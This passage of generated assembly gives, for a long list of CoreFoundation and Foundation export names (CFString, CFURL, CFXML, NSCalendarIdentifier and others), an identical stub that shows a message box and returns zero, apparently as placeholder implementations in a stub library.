call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetParagraphBounds
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetPascalString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetPascalStringPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetRangeOfCharacterClusterAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetRangeOfComposedCharactersAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetSmallestEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetSystemEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringHasPrefix
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringHasSuffix
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringHashCString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringHashCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringHashISOLatin1CString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringHashNSString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringInsert
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringIsEncodingAvailable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringIsHyphenationAvailableForLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringLowercase
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringNormalize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringOpenUText
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringPad
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringReplace
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringReplaceAll
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringSetExternalCharactersNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringTransform
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringTrim
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringTrimWhitespace
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringUppercase
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCopyAbbreviation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCopyAbbreviationDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCopyDefault
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCopyKnownNames
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCopyLocalizedName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCopySystem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCreateWithName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneCreateWithTimeIntervalFromGMT
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneGetData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneGetDaylightSavingTimeOffset
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneGetName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneGetNextDaylightSavingTimeTransition
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneGetSecondsFromGMT
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneIsDaylightSavingTime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneResetSystem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneSetAbbreviationDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTimeZoneSetDefault
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeAppendChild
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeApplyFunctionToChildren
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeFindRoot
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeGetChildAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeGetChildCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeGetChildren
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeGetFirstChild
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeGetNextSibling
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeGetParent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeInsertSibling
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreePrependChild
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeRemove
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeRemoveAllChildren
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeSetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTreeSortChildren
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFTypeGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCanBeDecomposed
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyAbsoluteURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyFileSystemPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyFragment
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyHostName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyLastPathComponent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyNetLocation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyParameterString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyPassword
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyPathExtension
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyQueryString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyResourceSpecifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyScheme
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyStrictPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCopyUserName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateAbsoluteURLWithBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateCopyAppendingPathComponent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateCopyAppendingPathExtension
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateCopyDeletingLastPathComponent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateCopyDeletingPathExtension
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateDataAndPropertiesFromResource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateFileReferenceURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateFromFileSystemRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateFromFileSystemRepresentationRelativeToBase
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreatePropertyFromResource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateStringByAddingPercentEscapes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateStringByReplacingPercentEscapes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateStringByReplacingPercentEscapesUsingEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateWithBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateWithFileSystemPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateWithFileSystemPathRelativeToBase
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLCreateWithString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLDestroyResource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLEnumeratorCreateForDirectoryURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLEnumeratorCreateForMountedVolumes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLEnumeratorGetDescendentLevel
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLEnumeratorGetNextURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLEnumeratorGetSourceDidChange
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLEnumeratorGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLEnumeratorSkipDescendents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLGetBaseURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLGetByteRangeForComponent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLGetBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLGetFileSystemRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLGetPortNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLGetString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLHasDirectoryPath
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFURLWriteDataAndPropertiesToResource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUUIDCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUUIDCreateFromString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUUIDCreateFromUUIDBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUUIDCreateString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUUIDCreateWithBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUUIDGetConstantUUIDWithBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUUIDGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUUIDGetUUIDBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharCompatibilityDecompose
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharDecompose
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharDecomposeCharacter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharFillDestinationBuffer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharGetBitmapForPlane
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharGetBitmapPtrForPlane
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharGetConditionalCaseMappingFlags
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharGetMappingData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharGetNumberOfPlanes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharGetNumberOfPlanesForUnicodePropertyData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharGetUnicodeProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharGetUnicodePropertyDataForPlane
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharIsMemberOf
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharMapCaseTo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharPrecompose
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharPrecomposeCharacter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFUniCharPrioritySort
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeCreateConnectToName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeCreateRunLoopSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeCreateWithName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeGetHandle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeGetName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeInvalidate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeIsValid
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWindowsNamedPipeSetInvalidationCallBack
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamCanAcceptBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamClose
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamCopyError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamCopyProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamCreateWithAllocatedBuffers
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamCreateWithBuffer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamCreateWithFile
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamGetError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamGetInfoPointer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamGetStatus
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamOpen
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamScheduleWithRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamSetClient
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamSetProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamSignalEvent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamUnscheduleFromRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFWriteStreamWrite
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLCreateStringByEscapingEntities
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLCreateStringByUnescapingEntities
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLNodeCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLNodeCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLNodeGetInfoPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLNodeGetString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLNodeGetTypeCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLNodeGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLNodeGetVersion
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserAbort
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserCopyErrorDescription
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserCreateWithDataFromURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserGetCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserGetDocument
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserGetLineNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserGetLocation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserGetSourceURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserGetStatusCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLParserParse
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLTreeCreateFromData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLTreeCreateFromDataWithError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLTreeCreateWithDataFromURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLTreeCreateWithNode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLTreeCreateXMLData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFXMLTreeGetNode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSBuddhistCalendar
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierBuddhist
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierChinese
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierCoptic
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierEthiopicAmeteAlem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierEthiopicAmeteMihret
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierGregorian
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierHebrew
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierISO8601
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierIndian
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierIslamic
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierIslamicCivil
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierJapanese
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
NSCalendarIdentifierPersian
push 0x0
mov eax r--data
push eax
push eax
push 0x0
